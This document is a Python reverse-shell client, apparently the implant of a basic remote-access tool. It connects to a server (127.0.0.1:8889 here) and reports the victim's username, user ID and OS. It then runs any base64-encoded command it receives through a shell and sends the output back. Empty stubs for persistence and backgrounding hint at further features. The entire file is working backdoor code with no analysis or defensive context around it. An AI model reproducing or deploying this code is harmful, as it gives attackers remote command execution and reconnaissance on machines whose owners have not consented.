import socket
import subprocess
import os
import base64
import pwd
import platform
import time

class Client:
    def __init__(self, server_ip, server_port):
        self.remote_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_ip = server_ip
        self.server_port = server_port

    def start_session(self):
        try:
            self.remote_server.connect((self.server_ip, self.server_port))
            self.send_message(pwd.getpwuid(os.getuid())[0])
            self.send_message(os.getuid())
            system = platform.uname()
            self.send_message(f"{system[0]} {system[2]}")
            while True:
                command = self.receive_message()
                command_args = command.split(" ")
                if command_args[0] == "kill":
                    self.remote_server.close()
                    break
                elif command_args[0] == "persist":
                    pass
                elif command_args[0] == "background":
                    pass
                elif command_args[0] == "help":
                    pass
                elif command_args[0] == "cd":
                    try:
                        os.chdir(command_args[1])
                        self.send_message(os.getcwd())
                    except FileNotFoundError:
                        self.send_message('Directory does not exist.')
                else:
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output = (process.stdout.read() + process.stderr.read()).decode()
                    self.send_message("\n" + output + "\n")
        except ConnectionRefusedError as e:
            print(e)

        except Exception as e:
            raise(e)

    def send_message(self, content):
        self.remote_server.send(self.encode(content))
        time.sleep(1)

    def receive_message(self, bit_length=4096):
        content = self.remote_server.recv(bit_length)
        return self.decode(content)

    def encode(self, content):
        message = base64.b64encode(bytes(str(content), encoding="utf8"))
        return message
    
    def decode(self, content):
        message = base64.b64decode(content.decode()).decode()
        return message

def main():
    client = Client('127.0.0.1', 8889)
    client.start_session()

if __name__ == "__main__":
    main()